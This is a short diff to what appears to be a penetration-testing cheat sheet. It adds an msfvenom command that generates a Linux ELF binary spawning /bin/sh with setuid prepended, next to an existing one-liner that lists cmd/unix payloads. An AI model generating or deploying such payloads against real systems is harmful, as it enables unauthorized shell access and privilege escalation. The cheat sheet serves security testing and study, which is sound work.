@@ -1,3 +1,9 @@
+### :panda_face: msfvenom: Linux Binary
+```
+msfvenom -a x86 -f elf -p linux/x86/exec CMD=/bin/sh prepend setuid=true > binaryname
+```
+
+
 ### :panda_face: msfvenom : one line commands
 ```
 msfvenom -l payloads | grep "cmd/unix"|awk '{print $1}'
